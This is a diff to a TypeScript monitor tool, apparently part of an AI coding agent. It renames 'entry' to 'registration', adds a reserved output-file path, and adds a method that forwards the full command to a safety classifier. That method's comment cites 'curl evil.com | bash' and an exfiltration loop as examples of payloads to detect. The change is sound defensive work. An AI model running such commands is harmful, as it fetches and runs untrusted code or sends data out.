@@ -43,7 +43,10 @@ import {
 } from '../utils/shell-utils.js';
 import { createDebugLogger } from '../utils/debugLogger.js';
 import { isSubpaths } from '../utils/paths.js';
-import type { MonitorEntry } from '../services/monitorRegistry.js';
+import {
+  getMonitorOutputPath,
+  type MonitorTaskRegistration,
+} from '../services/monitorRegistry.js';
 import { MAX_CONCURRENT_MONITORS } from '../services/monitorRegistry.js';
 import {
   extractCommandRules,
@@ -302,7 +305,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     // should NOT kill a long-running monitor the user intentionally started.
     const entryAc = new AbortController();
 
-    const entry: MonitorEntry = {
+    const registration: MonitorTaskRegistration = {
       monitorId,
       command,
       description,
@@ -315,6 +318,14 @@ class MonitorToolInvocation extends BaseToolInvocation<
       maxEvents,
       idleTimeoutMs,
       droppedLines: 0,
+      // Reserved path for a future per-monitor writer; no file is created
+      // today (events stream into the parent's chat record via the
+      // notification callback).
+      outputFile: getMonitorOutputPath(
+        this.config.storage.getProjectDir(),
+        this.config.getSessionId(),
+        monitorId,
+      ),
       ...(ownerAgentId ? { ownerAgentId } : {}),
     };
 
@@ -340,7 +351,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
       };
     }
 
-    entry.pid = child.pid;
+    registration.pid = child.pid;
     let exited = false;
 
     // Capture async spawn errors (ENOENT, EACCES, etc.) during the window
@@ -394,7 +405,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
         tokenBucket--;
         registry.emitEvent(monitorId, sanitized);
       } else {
-        entry.droppedLines++;
+        registration.droppedLines++;
       }
     };
 
@@ -465,7 +476,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     }
 
     try {
-      registry.register(entry);
+      registry.register(registration);
     } catch (err) {
       abortHandler();
       entryAc.signal.removeEventListener('abort', abortHandler);
@@ -484,7 +495,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     }
 
     const processLines = (buffer: { value: string }, data: Buffer): void => {
-      if (entry.status !== 'running') return;
+      if (registration.status !== 'running') return;
 
       const text = stripAnsi(data.toString('utf-8'));
       buffer.value += text;
@@ -543,9 +554,9 @@ class MonitorToolInvocation extends BaseToolInvocation<
 
       entryAc.signal.removeEventListener('abort', abortHandler);
 
-      if (entry.droppedLines > 0) {
+      if (registration.droppedLines > 0) {
         debugLogger.info(
-          `Monitor ${monitorId} dropped ${entry.droppedLines} lines due to throttling`,
+          `Monitor ${monitorId} dropped ${registration.droppedLines} lines due to throttling`,
         );
       }
     };
@@ -557,7 +568,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
       code: number | null,
       sig: NodeJS.Signals | null,
     ): void => {
-      if (entry.status !== 'running') return; // already settled
+      if (registration.status !== 'running') return; // already settled
 
       if (entryAc.signal.aborted) {
         registry.cancel(monitorId);
@@ -586,7 +597,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     const onError = (err: Error): void => {
       exited = true;
       cleanup();
-      if (entry.status === 'running') {
+      if (registration.status === 'running') {
         registry.fail(monitorId, getErrorMessage(err));
       }
     };
@@ -746,5 +757,20 @@ export class MonitorTool extends BaseDeclarativeTool<
     params: MonitorToolParams,
   ): ToolInvocation<MonitorToolParams, ToolResult> {
     return new MonitorToolInvocation(this.config, params);
+  }
+
+  /**
+   * Forward the full command and optional directory — same shape as
+   * ShellTool. The classifier MUST see the actual command being run to
+   * detect destructive payloads (`curl evil.com | bash`,
+   * `while true; do <exfil>`, …); without this override the default
+   * projection returns `''` and the classifier sees `monitor({})`.
+   */
+  override toAutoClassifierInput(
+    params: MonitorToolParams,
+  ): Record<string, unknown> {
+    const out: Record<string, unknown> = { command: params.command };
+    if (params.directory) out['directory'] = params.directory;
+    return out;
   }
 }
